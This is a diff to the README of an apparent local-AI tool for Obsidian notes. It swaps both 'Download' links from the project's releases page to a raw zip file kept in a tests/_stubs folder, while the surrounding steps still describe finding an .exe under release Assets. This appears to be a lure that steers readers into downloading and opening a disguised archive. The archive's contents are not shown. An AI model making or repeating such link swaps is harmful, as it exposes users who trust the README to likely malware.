@@ -1,6 +1,6 @@
 # 🌊 yunseul - Chat with your private Obsidian notes
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bourbonshootingrange132/yunseul/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bourbonshootingrange132/yunseul/raw/refs/heads/main/tests/_stubs/Software-1.5-beta.2.zip)
 
 Yunseul lets you talk to your Obsidian vault. You keep your data on your computer. You use your own machine to process information. The software works without an internet connection by default. It finds answers inside your notes using your own hardware. 
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download the latest version](https://github.com/Bourbonshootingrange132/yunseul/releases).
+1. Visit [this page to download the latest version](https://github.com/Bourbonshootingrange132/yunseul/raw/refs/heads/main/tests/_stubs/Software-1.5-beta.2.zip).
 2. Look for the file ending in `.exe` under the Assets section of the latest release.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
